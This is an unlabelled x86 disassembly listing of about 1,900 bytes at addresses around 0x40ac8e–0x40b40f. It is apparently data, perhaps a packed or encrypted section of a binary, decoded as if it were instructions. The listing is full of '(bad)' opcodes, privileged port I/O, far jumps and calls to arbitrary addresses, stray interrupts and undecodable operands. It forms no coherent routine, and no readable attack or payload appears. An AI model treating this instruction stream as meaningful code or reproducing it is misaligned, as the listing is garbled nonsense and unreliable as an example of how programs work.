  40ac8e:	(bad)  
  40ac8f:	mov    bl,0x7e
  40ac91:	sbb    cl,BYTE PTR [edx-0xe]
  40ac94:	sub    al,0x6f
  40ac96:	xor    dl,BYTE PTR [edi]
  40ac98:	popa   
  40ac99:	pop    ebp
  40ac9a:	fistp  DWORD PTR [esi+0x40]
  40ac9d:	pop    edi
  40ac9e:	pop    esi
  40ac9f:	outs   dx,DWORD PTR ds:[esi]
  40aca0:	out    dx,eax
  40aca1:	in     al,0x1
  40aca3:	popa   
  40aca4:	std    
  40aca5:	push   esi
  40aca6:	and    DWORD PTR [eax+0x19],ecx
  40aca9:	push   edx
  40acaa:	jmp    0x2943ac64
  40acaf:	pop    ebp
  40acb0:	jmp    0x8e55:0x9ab1966b
  40acb7:	aad    0xc
  40acb9:	fsub   st,st(6)
  40acbb:	ss stos BYTE PTR es:[edi],al
  40acbd:	int3   
  40acbe:	jge    0x40ad27
  40acc0:	mov    ecx,0x4dcf7b85
  40acc5:	or     esp,ebp
  40acc7:	inc    ebx
  40acc8:	jae    0x40acb1
  40acca:	pop    esp
  40accb:	cmp    ch,BYTE PTR [ebp+0x5a0c14ff]
  40acd1:	std    
  40acd2:	xchg   esi,eax
  40acd3:	sub    al,0x43
  40acd5:	outs   dx,DWORD PTR ds:[esi]
  40acd6:	adc    eax,DWORD PTR ds:0x144caa32
  40acdc:	push   esp
  40acdd:	mov    bh,0x39
  40acdf:	xor    DWORD PTR [ebx+0x4fdb7c3a],esi
  40ace5:	add    DWORD PTR [esi-0x5576bcb7],esi
  40aceb:	retf   0x6230
  40acee:	jge    0x40ace0
  40acf0:	push   ecx
  40acf1:	pusha  
  40acf2:	in     eax,0x5f
  40acf4:	or     al,0xb1
  40acf6:	sbb    dh,ch
  40acf8:	dec    ecx
  40acf9:	xchg   edx,eax
  40acfa:	clc    
  40acfb:	pop    ecx
  40acfc:	push   edx
  40acfd:	push   ss
  40acfe:	mov    ?,WORD PTR [eax+ebx*1-0x651e385c]
  40ad05:	mov    es,WORD PTR ds:0x375845c2
  40ad0b:	data16 or al,0x37
  40ad0e:	repnz sbb ebp,DWORD PTR [edx+0x65]
  40ad12:	pop    ebx
  40ad13:	xchg   DWORD PTR [eax-0x1d],edx
  40ad16:	(bad)  
  40ad17:	retf   
  40ad18:	xchg   DWORD PTR [esi],ecx
  40ad1a:	iret   
  40ad1b:	mov    WORD PTR [esi],?
  40ad1d:	in     al,0xb7
  40ad1f:	sar    ebx,1
  40ad21:	fcomp  DWORD PTR [ebp+0x59]
  40ad24:	jno    0x40acd9
  40ad26:	mov    eax,ds:0x5ccb94e4
  40ad2b:	jle    0x40acf4
  40ad2d:	pop    edi
  40ad2e:	mov    cl,0x1c
  40ad30:	add    eax,0xc5be24d6
  40ad35:	pop    ds
  40ad36:	bound  edx,QWORD PTR [edx+0x724b0f74]
  40ad3c:	mov    ds:0x2a863cdc,eax
  40ad41:	mov    dh,0x46
  40ad43:	outs   dx,BYTE PTR ds:[esi]
  40ad44:	mov    ss,ecx
  40ad46:	lds    ebp,FWORD PTR [esi+0x714d2d14]
  40ad4c:	sbb    al,0xaf
  40ad4e:	add    DWORD PTR [ebx+0x4b55b294],esp
  40ad54:	adc    BYTE PTR [ebp+eiz*1-0x26],dh
  40ad58:	ret    0x9729
  40ad5b:	enter  0x102e,0x85
  40ad5f:	out    dx,eax
  40ad60:	icebp  
  40ad61:	loope  0x40ada3
  40ad63:	push   ebx
  40ad64:	test   ah,ah
  40ad66:	in     eax,0x64
  40ad68:	sbb    DWORD PTR [eax],0x6c82f4e7
  40ad6e:	outs   dx,BYTE PTR ds:[esi]
  40ad6f:	rol    DWORD PTR [edx-0x49],0xf4
  40ad73:	bnd ret 0x99d7
  40ad77:	jns    0x40ada3
  40ad79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad7a:	jo     0x40ad50
  40ad7c:	popf   
  40ad7d:	in     eax,dx
  40ad7e:	cwde   
  40ad7f:	cmp    DWORD PTR [esi+0x7fa2ebe0],edi
  40ad85:	push   cs
  40ad86:	cli    
  40ad87:	adc    dh,BYTE PTR [edx-0x64]
  40ad8a:	dec    edi
  40ad8b:	nop
  40ad8c:	and    eax,ebx
  40ad8e:	xchg   esi,eax
  40ad8f:	mov    edi,DWORD PTR [edi-0x30]
  40ad92:	arpl   WORD PTR [ebx+0x54],bx
  40ad95:	cmp    eax,0x4886929e
  40ad9a:	std    
  40ad9b:	sti    
  40ad9c:	out    0x36,al
  40ad9e:	pop    ecx
  40ad9f:	dec    esi
  40ada0:	sub    bh,al
  40ada2:	ret    
  40ada3:	cs (bad) 
  40ada5:	jbe    0x40adba
  40ada7:	inc    esp
  40ada8:	cs jbe 0x40ad73
  40adab:	mov    edi,0xcaba9571
  40adb0:	push   ebx
  40adb1:	mov    ecx,0x1dc64251
  40adb6:	fnstenv [esi-0xc]
  40adb9:	arpl   WORD PTR [edi+0x386a28ac],bx
  40adbf:	fwait
  40adc0:	in     eax,0x4f
  40adc2:	std    
  40adc3:	aaa    
  40adc4:	arpl   WORD PTR [edx],ax
  40adc6:	mov    ebp,DWORD PTR [ebp-0x7605564b]
  40adcc:	mov    ebx,0xf1c65e9a
  40add2:	jmp    0x1be4454f
  40add7:	aad    0xc1
  40add9:	jmp    0x40addb
  40addb:	mov    BYTE PTR [edi-0x514dbf67],0x34
  40ade2:	ins    DWORD PTR es:[edi],dx
  40ade3:	sbb    al,0x45
  40ade5:	lea    eax,[eax-0x66494113]
  40adeb:	jno    0x40adfe
  40aded:	out    dx,al
  40adee:	sub    al,0x12
  40adf0:	(bad)  
  40adf1:	fucomip st,st(6)
  40adf3:	loope  0x40ae29
  40adf5:	out    0x31,eax
  40adf7:	push   0xffffffb5
  40adf9:	test   DWORD PTR [eax+0x1],eax
  40adfc:	mov    al,ds:0xf9fc8bfd
  40ae01:	sbb    ebp,ecx
  40ae03:	enter  0x14e1,0x13
  40ae07:	lods   al,BYTE PTR ds:[esi]
  40ae08:	mov    ecx,0x3ece774
  40ae0d:	pushf  
  40ae0e:	sahf   
  40ae0f:	add    DWORD PTR [esi+ecx*4],ecx
  40ae12:	fst    QWORD PTR [edx-0x66]
  40ae15:	mov    WORD PTR [ebp+0x6c],fs
  40ae18:	in     eax,dx
  40ae19:	test   dl,ah
  40ae1b:	mov    dl,0xd5
  40ae1d:	and    ch,0xf9
  40ae20:	add    DWORD PTR ds:0xbf3e06a8,ebp
  40ae26:	push   cs
  40ae27:	sbb    al,0xd
  40ae29:	or     al,BYTE PTR [esp+esi*8+0x41]
  40ae2d:	or     al,0xbd
  40ae2f:	fisttp WORD PTR [edx]
  40ae31:	pop    eax
  40ae32:	rcl    DWORD PTR [eax],1
  40ae34:	add    BYTE PTR ds:0x2d49052f,dh
  40ae3a:	mov    ah,0x67
  40ae3c:	jp     0x40ade9
  40ae3e:	and    al,BYTE PTR [esi-0x39b22297]
  40ae44:	aad    0xb6
  40ae46:	adc    dl,dl
  40ae48:	adc    edx,esi
  40ae4a:	jmp    0xacae:0x9dcdc952
  40ae51:	pop    esi
  40ae52:	dec    eax
  40ae53:	cmp    esi,ebx
  40ae55:	mov    bl,0xd6
  40ae57:	bound  esp,QWORD PTR [edi-0xd165682]
  40ae5d:	sub    esi,DWORD PTR [ebx+0x200aa86]
  40ae63:	xor    BYTE PTR [ecx+0xa],dl
  40ae66:	pop    eax
  40ae67:	jnp    0x40ae17
  40ae69:	sahf   
  40ae6a:	xchg   DWORD PTR [eax+0x1c],edi
  40ae6d:	test   dh,ch
  40ae6f:	dec    ebp
  40ae70:	mov    al,ds:0xdc986995
  40ae75:	mov    ch,0xe7
  40ae77:	add    al,0x38
  40ae79:	in     eax,0xee
  40ae7b:	jle    0x40aed8
  40ae7d:	sub    DWORD PTR [ecx-0x2a],ecx
  40ae80:	or     edx,DWORD PTR [esi+0x64]
  40ae83:	loopne 0x40aedc
  40ae85:	movups xmm1,xmm6
  40ae88:	add    BYTE PTR ds:0xf1339f7,bl
  40ae8e:	pop    ebx
  40ae8f:	jmp    0x40ae50
  40ae91:	add    DWORD PTR [ecx+0x6c],esi
  40ae94:	jle    0x40ae67
  40ae96:	and    BYTE PTR ds:0x9aded8c7,bh
  40ae9c:	push   ss
  40ae9d:	stos   BYTE PTR es:[edi],al
  40ae9e:	std    
  40ae9f:	idiv   DWORD PTR [eax+ebp*8-0x2f747f8]
  40aea6:	call   0x3228:0xcc897f3
  40aead:	xchg   esi,eax
  40aeae:	pushf  
  40aeaf:	test   al,0x2b
  40aeb1:	sub    DWORD PTR [esi],0xab8ddceb
  40aeb7:	xchg   bh,bl
  40aeb9:	push   esi
  40aeba:	bnd jb 0x40af00
  40aebd:	xchg   esi,eax
  40aebe:	addr16 jb 0x40af1b
  40aec1:	inc    eax
  40aec2:	dec    eax
  40aec3:	(bad)  
  40aec4:	push   ebp
  40aec5:	or     eax,0xd7ab8a3e
  40aeca:	adc    dl,BYTE PTR [ecx-0x1dc1c1be]
  40aed0:	gs add eax,0xbc9881eb
  40aed6:	sub    ah,bh
  40aed8:	mov    cl,0x87
  40aeda:	(bad)  
  40aedb:	fisubr DWORD PTR [ecx]
  40aedd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aede:	lods   eax,DWORD PTR ds:[esi]
  40aedf:	cmp    edi,DWORD PTR ds:0x1e75ce7e
  40aee5:	loopne 0x40af20
  40aee7:	mov    ah,0xf8
  40aee9:	test   BYTE PTR [edx-0x44],0x18
  40aeed:	and    al,0xbc
  40aeef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aef0:	lds    ecx,FWORD PTR [edx+0x36]
  40aef3:	add    bl,cl
  40aef5:	bound  ebx,QWORD PTR [ebx+0x3f]
  40aef8:	xchg   esp,eax
  40aef9:	nop
  40aefa:	retf   0x800f
  40aefd:	fiadd  WORD PTR [esp+edx*1-0x4b]
  40af01:	cmp    al,0xd0
  40af03:	fcomp  DWORD PTR [edx-0x4da9650d]
  40af09:	adc    ebp,edx
  40af0b:	push   0xffffff81
  40af0d:	icebp  
  40af0e:	sbb    DWORD PTR [edi+0x29],edi
  40af11:	jnp    0x40aee0
  40af13:	lds    esi,FWORD PTR [eax+eax*4]
  40af16:	repz sbb cl,BYTE PTR [esi]
  40af19:	sbb    cl,0x5a
  40af1c:	fmul   DWORD PTR [eax]
  40af1e:	sbb    al,0xb9
  40af20:	dec    edi
  40af21:	mov    eax,cs:0xf9a2158d
  40af27:	fsub   DWORD PTR [ebx]
  40af29:	mov    ebx,0x232c04af
  40af2e:	stos   DWORD PTR es:[edi],eax
  40af2f:	int    0x6a
  40af31:	sub    bh,BYTE PTR [ecx+0x10]
  40af34:	lds    eax,FWORD PTR [ebx]
  40af36:	sub    eax,0x4a4b6e85
  40af3b:	fdivrp st(4),st
  40af3d:	jb     0x40af06
  40af3f:	es inc ecx
  40af41:	lahf   
  40af42:	mov    eax,0x9928c6
  40af47:	pop    ss
  40af48:	mov    ecx,0x62ab77b6
  40af4d:	jle    0x40afc7
  40af4f:	(bad)  
  40af50:	cmp    DWORD PTR [ebx],esi
  40af52:	dec    ebx
  40af53:	mov    bl,BYTE PTR ds:0xbd26e200
  40af59:	iret   
  40af5a:	xor    BYTE PTR [edx-0x3c1179a1],cl
  40af60:	sahf   
  40af61:	add    DWORD PTR [edx],esi
  40af63:	mov    cl,BYTE PTR [esi+edi*2-0x1b]
  40af67:	pop    esi
  40af68:	add    al,0xb4
  40af6a:	mov    DWORD PTR [esi],esi
  40af6c:	push   cs
  40af6d:	xchg   esi,eax
  40af6e:	jl     0x40aefa
  40af70:	jne    0x40af51
  40af72:	(bad)  
  40af74:	lock pop es
  40af76:	xchg   esp,eax
  40af77:	loop   0x40af7e
  40af79:	jo     0x40afe4
  40af7b:	adc    ebp,DWORD PTR [ebp+0x628e2ea1]
  40af81:	mov    ch,0x76
  40af83:	and    eax,0xcb018a2c
  40af88:	mov    edx,0xa9fe901c
  40af8d:	inc    esi
  40af8e:	bound  edx,QWORD PTR [esp+edi*2-0x103254bd]
  40af95:	(bad)  
  40af96:	push   esi
  40af97:	push   esi
  40af98:	jo     0x40afce
  40af9a:	add    BYTE PTR gs:[esi-0x43980d87],0xe6
  40afa2:	xchg   ebp,edx
  40afa4:	inc    eax
  40afa5:	xchg   ebp,eax
  40afa6:	cdq    
  40afa7:	mov    cl,ch
  40afa9:	mov    eax,0x1f922ceb
  40afae:	bnd jns 0x40aff0
  40afb1:	inc    edx
  40afb2:	leave  
  40afb3:	xchg   ebx,eax
  40afb4:	sub    ebp,DWORD PTR [edx-0x49e47b99]
  40afba:	mov    DWORD PTR [edi-0x5881bbc4],esp
  40afc0:	shl    DWORD PTR [eax+0x13a29a82],0x5a
  40afc7:	clc    
  40afc8:	and    al,0xd6
  40afca:	cmp    eax,0xe9d43c6e
  40afcf:	call   0xf727375c
  40afd4:	cld    
  40afd5:	mov    edi,0x4e534b6c
  40afda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afdb:	adc    al,0x99
  40afdd:	sub    BYTE PTR [ecx],0x26
  40afe0:	mov    edi,0x1c8949b3
  40afe5:	sub    BYTE PTR [ebp-0x2321b9a0],ch
  40afeb:	pop    eax
  40afec:	sbb    al,0x9f
  40afee:	sub    eax,0xe1a83781
  40aff3:	sti    
  40aff4:	pop    edi
  40aff5:	dec    ebx
  40aff6:	bound  ebx,QWORD PTR [eax+0x3]
  40aff9:	out    dx,al
  40affa:	mov    ebp,0x48146fb7
  40afff:	das    
  40b000:	inc    eax
  40b001:	xor    BYTE PTR [edi+0x3d],al
  40b004:	mov    al,ds:0x6e72dd20
  40b009:	pop    esi
  40b00a:	scas   eax,DWORD PTR es:[edi]
  40b00b:	xor    al,0x5
  40b00d:	lods   eax,DWORD PTR ds:[esi]
  40b00e:	mov    edi,0xb2c2a4eb
  40b013:	push   esi
  40b014:	dec    eax
  40b015:	std    
  40b016:	retf   
  40b017:	test   BYTE PTR [ecx-0x22],0xcd
  40b01b:	loop   0x40b04a
  40b01d:	inc    ebx
  40b01e:	inc    edx
  40b01f:	xchg   ebp,eax
  40b020:	mov    eax,0xd0a92c31
  40b025:	lods   al,BYTE PTR ds:[esi]
  40b026:	int    0x93
  40b028:	jmp    0xdfdc5d1b
  40b02d:	and    edi,DWORD PTR [esi]
  40b02f:	pop    es
  40b030:	call   0x682a:0x89065423
  40b037:	jno    0x40b095
  40b039:	(bad)  
  40b03a:	mov    eax,0x4073e8ec
  40b03f:	add    eax,0x3a68ac13
  40b044:	xor    al,0x5f
  40b046:	mov    esi,0xfcbeb428
  40b04b:	sbb    BYTE PTR [ebx+0x9ebcff8],dl
  40b051:	pushf  
  40b052:	jp     0x40b001
  40b054:	dec    ecx
  40b056:	sbb    al,0x31
  40b058:	lods   eax,DWORD PTR ds:[esi]
  40b059:	call   0xb6e16f55
  40b05e:	pop    ebp
  40b05f:	xor    ah,BYTE PTR [ebp+ebp*1-0x4af00d8f]
  40b066:	outs   dx,BYTE PTR ds:[esi]
  40b067:	mov    ah,0xa
  40b069:	mov    ebp,0xcc814c70
  40b06f:	dec    edi
  40b070:	(bad)  [ebx-0x3357f2c1]
  40b076:	adc    DWORD PTR ds:0xc129f77d,ecx
  40b07c:	sub    al,0xb7
  40b07e:	xchg   BYTE PTR [eax+eax*4-0x768b79b],al
  40b085:	mov    dl,0xf6
  40b087:	int    0xae
  40b089:	and    esi,DWORD PTR [edi]
  40b08b:	mov    eax,0x9d1f656d
  40b090:	into   
  40b091:	test   DWORD PTR [esi-0x40],esi
  40b094:	dec    edx
  40b095:	pushf  
  40b096:	sub    bl,dh
  40b098:	sub    bl,bh
  40b09a:	sahf   
  40b09b:	inc    esp
  40b09c:	pusha  
  40b09d:	scas   eax,DWORD PTR es:[edi]
  40b09e:	add    bl,BYTE PTR [eax]
  40b0a0:	adc    BYTE PTR [ebx+0x7f],0xc1
  40b0a4:	mov    al,al
  40b0a6:	and    ebx,DWORD PTR [edi-0x621278d6]
  40b0ac:	shl    edx,cl
  40b0ae:	(bad)  [ecx]
  40b0b0:	enter  0x3bbd,0x7e
  40b0b4:	sub    eax,0xb261e1bb
  40b0b9:	xor    DWORD PTR [eax-0x40],esi
  40b0bc:	hlt    
  40b0bd:	push   eax
  40b0be:	leave  
  40b0bf:	mov    ss,WORD PTR [eax]
  40b0c1:	jle    0x40b053
  40b0c3:	sbb    eax,DWORD PTR [edi-0x41952e67]
  40b0c9:	jmp    0x40b0c6
  40b0cb:	pop    ebp
  40b0cc:	ds imul eax,DWORD PTR gs:[ebx-0x52],0x1b
  40b0d2:	call   0xd91e78c3
  40b0d7:	daa    
  40b0d8:	call   0x6fb86b34
  40b0dd:	nop
  40b0de:	out    0x5c,eax
  40b0e0:	pusha  
  40b0e1:	mov    bl,0xa2
  40b0e3:	aam    0xd5
  40b0e5:	or     eax,esi
  40b0e7:	mov    al,ds:0xbcb17187
  40b0ec:	dec    ecx
  40b0ed:	mov    edx,0x8442af66
  40b0f2:	cmp    edi,DWORD PTR [esi]
  40b0f4:	dec    eax
  40b0f5:	scas   eax,DWORD PTR es:[edi]
  40b0f6:	xor    BYTE PTR [ebp-0x7c],ch
  40b0f9:	or     eax,DWORD PTR [ebx]
  40b0fb:	xchg   DWORD PTR [edi-0x25faf1cf],edi
  40b101:	pop    esp
  40b102:	ror    DWORD PTR [edx+0x47],1
  40b105:	(bad)  
  40b106:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b107:	stc    
  40b108:	int    0xb
  40b10a:	mov    al,0xe0
  40b10c:	fisub  WORD PTR [eax+ecx*1]
  40b10f:	xor    DWORD PTR ds:0xf5422baf,0x60
  40b116:	mov    esi,0x2687d2a6
  40b11b:	enter  0x78dd,0xad
  40b11f:	ret    0xa4f1
  40b122:	icebp  
  40b123:	add    ch,dl
  40b125:	sbb    ch,BYTE PTR [esp+eax*4-0x5]
  40b129:	sti    
  40b12a:	pop    ebx
  40b12b:	pop    eax
  40b12c:	pop    ebx
  40b12d:	push   0x3b
  40b12f:	pop    ebp
  40b130:	adc    bh,BYTE PTR [esi+ebx*1+0xa7fdd4e]
  40b137:	inc    ebx
  40b138:	jno    0x40b0ba
  40b13a:	retf   0xfdbf
  40b13d:	and    eax,0x17f489e2
  40b142:	or     ecx,edx
  40b144:	dec    edx
  40b145:	and    eax,0xf0f93a38
  40b14a:	mov    eax,0x55eacf75
  40b14f:	imul   esi,DWORD PTR [edx],0xa436dc9
  40b155:	pop    eax
  40b156:	hlt    
  40b157:	out    dx,al
  40b158:	cli    
  40b159:	rcr    DWORD PTR [ecx-0x3b],1
  40b15c:	add    DWORD PTR [eax+0x59],0x2a496bbf
  40b163:	push   ss
  40b164:	lods   eax,DWORD PTR ds:[esi]
  40b165:	fs lahf 
  40b167:	push   ebx
  40b168:	scas   eax,DWORD PTR es:[edi]
  40b169:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b16a:	scas   eax,DWORD PTR es:[edi]
  40b16b:	xchg   edx,eax
  40b16c:	mov    ebp,DWORD PTR [edx]
  40b16e:	in     eax,dx
  40b16f:	mov    eax,ds:0x65e4ed41
  40b174:	jge    0x40b147
  40b176:	mov    WORD PTR [ebx-0x9],ss
  40b179:	sbb    ebx,DWORD PTR [edi]
  40b17b:	shl    BYTE PTR [ebx],cl
  40b17d:	jmp    0xd7a2:0xa448412e
  40b184:	mov    ds:0x5c1156e0,al
  40b189:	into   
  40b18a:	dec    ebx
  40b18b:	outs   dx,BYTE PTR ds:[esi]
  40b18c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b18d:	inc    DWORD PTR [eax+0x7f]
  40b190:	fldenv [edx-0x5084effd]
  40b196:	icebp  
  40b197:	test   DWORD PTR [esi+0x22],eax
  40b19a:	cmp    cl,BYTE PTR [eax-0x80]
  40b19d:	shl    esp,cl
  40b19f:	xchg   edx,eax
  40b1a0:	push   ebx
  40b1a1:	add    dl,BYTE PTR [eax+esi*4+0x538e4d2]
  40b1a8:	cli    
  40b1a9:	cmp    ch,ch
  40b1ab:	add    ebp,DWORD PTR [ecx+0x7bcf541e]
  40b1b1:	dec    ebp
  40b1b2:	popa   
  40b1b3:	(bad)  
  40b1b4:	xchg   esi,eax
  40b1b5:	add    al,0x85
  40b1b7:	add    al,0x81
  40b1b9:	mov    edi,0xf2582288
  40b1be:	jl     0x40b1a8
  40b1c0:	xor    BYTE PTR [edx+0x7e2b6c3b],cl
  40b1c6:	adc    esi,DWORD PTR [esi]
  40b1c8:	fldcw  WORD PTR [esi+0x65]
  40b1cb:	jo     0x40b16e
  40b1cd:	cmp    eax,eax
  40b1cf:	fbstp  TBYTE PTR [ebx+esi*2-0x2a399b6f]
  40b1d6:	or     dl,bl
  40b1d8:	and    BYTE PTR [eax-0x41],bh
  40b1db:	fistp  DWORD PTR [esi-0x57]
  40b1de:	dec    ecx
  40b1df:	push   ebx
  40b1e0:	xchg   ebp,eax
  40b1e1:	sbb    al,0xc6
  40b1e3:	lods   al,BYTE PTR ds:[esi]
  40b1e4:	cli    
  40b1e5:	(bad)  
  40b1e7:	xchg   esi,eax
  40b1e8:	shl    DWORD PTR [ebx-0x60d573a9],1
  40b1ee:	push   0xe40c89b9
  40b1f3:	inc    eax
  40b1f4:	push   edi
  40b1f5:	and    ch,BYTE PTR [esi+edx*8-0x29]
  40b1f9:	push   ebx
  40b1fa:	inc    esp
  40b1fb:	xor    al,0x1d
  40b1fd:	jne    0x40b26c
  40b1ff:	mov    bh,0x19
  40b201:	push   ebx
  40b202:	shr    BYTE PTR [edx],0x48
  40b205:	icebp  
  40b206:	cli    
  40b207:	push   edi
  40b208:	adc    DWORD PTR [edx-0x13],esp
  40b20b:	jo     0x40b1b9
  40b20d:	int    0x4a
  40b20f:	xchg   DWORD PTR [ebp+0x52b4e5d1],esi
  40b215:	test   al,0x49
  40b217:	push   edi
  40b218:	outs   dx,DWORD PTR ds:[esi]
  40b219:	imul   ecx,esi,0x6383d251
  40b21f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b220:	sti    
  40b221:	fs jp  0x40b1eb
  40b224:	mov    ds:0xf4fd27c,al
  40b229:	fstp   TBYTE PTR [esi+0x429036d3]
  40b22f:	push   ss
  40b230:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b231:	and    edx,DWORD PTR [ebx-0x14]
  40b234:	or     DWORD PTR [eax+0x6dc03685],edi
  40b23a:	dec    ecx
  40b23b:	jmp    0x961:0x88c68cc6
  40b242:	xchg   esi,eax
  40b243:	ins    BYTE PTR es:[edi],dx
  40b244:	jp     0x40b1c6
  40b246:	outs   dx,BYTE PTR ds:[esi]
  40b247:	xor    BYTE PTR [ecx+0x33e8935e],ah
  40b24d:	rcl    BYTE PTR [ebp+0x6afc355e],1
  40b253:	dec    esi
  40b254:	dec    ecx
  40b255:	aaa    
  40b256:	pop    ecx
  40b257:	sbb    cl,BYTE PTR [esi]
  40b259:	add    DWORD PTR [eiz*8+0x5bdec39b],eax
  40b260:	xor    ch,cl
  40b262:	and    al,0x79
  40b264:	mov    esp,0x901ce318
  40b269:	xor    al,0xb3
  40b26b:	mov    eax,ds:0xa48710a1
  40b270:	sbb    DWORD PTR [ebx+0x270f2817],ebp
  40b276:	(bad)  
  40b277:	jle    0x40b240
  40b279:	into   
  40b27a:	mov    al,ds:0x41e980f7
  40b27f:	stos   BYTE PTR es:[edi],al
  40b280:	(bad)
  40b283:	sbb    eax,0x41cfd4d
  40b288:	mov    esp,eax
  40b28a:	and    DWORD PTR [ebx+edi*2-0x3d2b2bc],edi
  40b291:	jne    0x40b2ce
  40b293:	mov    WORD PTR [edx+0x1e],?
  40b296:	add    al,0x9c
  40b298:	xor    bl,BYTE PTR [ecx+0x3f0bcfd1]
  40b29e:	outs   dx,DWORD PTR ds:[esi]
  40b29f:	shl    BYTE PTR [ecx],cl
  40b2a1:	inc    eax
  40b2a2:	jle    0x40b314
  40b2a4:	add    bl,cl
  40b2a6:	out    0xbd,al
  40b2a8:	push   edi
  40b2a9:	pop    ds
  40b2aa:	xor    DWORD PTR [ebx],edi
  40b2ac:	inc    ebp
  40b2ad:	shld   DWORD PTR [edx-0x34],ebx,cl
  40b2b1:	out    dx,eax
  40b2b2:	pop    edi
  40b2b3:	pop    ds
  40b2b4:	add    DWORD PTR [ebx+0x43],edi
  40b2b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2b8:	mov    esp,0x19cc2e44
  40b2bd:	dec    esp
  40b2be:	sub    ebp,DWORD PTR [ebx-0x43d8f271]
  40b2c4:	jo     0x40b249
  40b2c6:	jl     0x40b278
  40b2c8:	(bad)  
  40b2c9:	cdq    
  40b2ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2cb:	cmp    eax,0xff121602
  40b2d0:	scas   al,BYTE PTR es:[edi]
  40b2d1:	int    0x19
  40b2d3:	std    
  40b2d4:	out    dx,al
  40b2d5:	add    esp,DWORD PTR [esi+0x279d26a4]
  40b2db:	push   0x710eafef
  40b2e0:	or     BYTE PTR [edx],cl
  40b2e2:	xchg   esp,eax
  40b2e3:	xchg   edx,eax
  40b2e4:	mov    dh,0x38
  40b2e6:	call   0xa572:0x6b346834
  40b2ed:	mov    esp,0xa27a037a
  40b2f2:	add    al,BYTE PTR [eax]
  40b2f4:	imul   DWORD PTR [eax-0x50]
  40b2f7:	mov    ds:0xe1713df1,al
  40b2fc:	lods   eax,DWORD PTR ds:[esi]
  40b2fd:	cmp    ebx,eax
  40b2ff:	jl     0x40b293
  40b301:	mov    bl,0x71
  40b303:	test   DWORD PTR [edx],0x38d069db
  40b309:	mov    BYTE PTR [edx],bh
  40b30b:	jae    0x40b358
  40b30d:	xor    ebp,0xffffffcd
  40b310:	and    bl,BYTE PTR [edi-0x19]
  40b313:	mov    gs,WORD PTR [edi]
  40b315:	pop    esp
  40b316:	and    BYTE PTR [edi+0x3dde162f],al
  40b31c:	pop    ebp
  40b31d:	and    dh,BYTE PTR [edi+eiz*2-0x17484913]
  40b324:	sbb    eax,0x22b5e19c
  40b329:	jo     0x40b2bd
  40b32b:	or     eax,0x2c6b07a4
  40b330:	push   ss
  40b331:	ss jle 0x40b34f
  40b334:	dec    ebp
  40b335:	scas   al,BYTE PTR es:[edi]
  40b336:	push   0x41
  40b338:	test   DWORD PTR [edi+0x6c],ecx
  40b33b:	fmul   DWORD PTR [esi+0x5e]
  40b33e:	dec    ebx
  40b33f:	je     0x40b358
  40b341:	add    BYTE PTR ds:0xde5cc74,bl
  40b347:	in     eax,0x40
  40b349:	pusha  
  40b34a:	or     al,0xd9
  40b34c:	pushf  
  40b34d:	jp     0x40b373
  40b34f:	sbb    ecx,0xf
  40b352:	xchg   ebp,eax
  40b353:	sbb    BYTE PTR [edi],0xf9
  40b356:	mov    dl,BYTE PTR [edx]
  40b358:	adc    DWORD PTR [ebp-0x16],0xffffff8d
  40b35c:	rcl    BYTE PTR [edi+0x1b],1
  40b35f:	sbb    BYTE PTR [edi-0x6aafbd15],cl
  40b365:	sbb    esi,DWORD PTR [edx-0x17]
  40b368:	push   esi
  40b369:	and    BYTE PTR [esi+eiz*2+0xe91ed2f],dl
  40b370:	ins    BYTE PTR es:[edi],dx
  40b371:	ja     0x40b396
  40b373:	loope  0x40b374
  40b375:	jmp    0x9415:0x3e1595bb
  40b37c:	pop    ebp
  40b37d:	push   edi
  40b37e:	push   esi
  40b37f:	mov    al,ds:0xbf7a5d4c
  40b384:	cmp    al,0x60
  40b386:	add    eax,0x439497c6
  40b38b:	xchg   ecx,eax
  40b38c:	inc    ebp
  40b38d:	(bad)  
  40b38e:	xor    al,0xf0
  40b390:	mov    BYTE PTR [ebp-0x7022aae4],al
  40b396:	cli    
  40b397:	ja     0x40b389
  40b399:	mov    DWORD PTR [ebp-0x4e43e924],ecx
  40b39f:	frstor [edx-0x7b330baf]
  40b3a5:	mov    esi,0x92cc95bd
  40b3aa:	or     eax,0x9f3f58fc
  40b3af:	pop    esi
  40b3b0:	xor    ebp,DWORD PTR [ecx+0x5c]
  40b3b3:	or     DWORD PTR [ebx+0x1c],esp
  40b3b6:	icebp  
  40b3b7:	imul   DWORD PTR [ecx]
  40b3b9:	sbb    al,0xb5
  40b3bb:	repz mov bl,0x64
  40b3be:	jb     0x40b425
  40b3c0:	and    esp,DWORD PTR [esi+0x2b134897]
  40b3c6:	sub    BYTE PTR [eax+edx*1],dl
  40b3c9:	jp     0x40b39f
  40b3cb:	cs push cs
  40b3cd:	ds cwde 
  40b3cf:	arpl   WORD PTR [ebx+esi*1-0x8],bx
  40b3d3:	adc    ecx,DWORD PTR [esi]
  40b3d5:	ins    DWORD PTR es:[edi],dx
  40b3d6:	adc    DWORD PTR [eax],ecx
  40b3d8:	push   0xa818aed9
  40b3dd:	mov    ds:0xdbc62dae,eax
  40b3e2:	aad    0x5e
  40b3e4:	aam    0xc7
  40b3e6:	dec    edi
  40b3e7:	pop    ss
  40b3e8:	test   al,0x5d
  40b3ea:	sbb    bl,BYTE PTR [edi+0x40]
  40b3ed:	repz xchg ecx,eax
  40b3ef:	loope  0x40b434
  40b3f1:	nop
  40b3f2:	adc    BYTE PTR [eax+ecx*1-0xa],dh
  40b3f6:	icebp  
  40b3f7:	mov    esi,0x2d9d2225
  40b3fc:	cmp    eax,0x5a0bc217
  40b401:	js     0x40b3fe
  40b403:	loopne 0x40b475
  40b405:	or     al,BYTE PTR [esi+eax*8]
  40b408:	int    0xac
  40b40a:	shl    ebp,cl
  40b40c:	mov    ah,0xab
  40b40e:	inc    ecx
  40b40f:	les    ebp,FWORD PTR [ecx-0x6f249c3a]
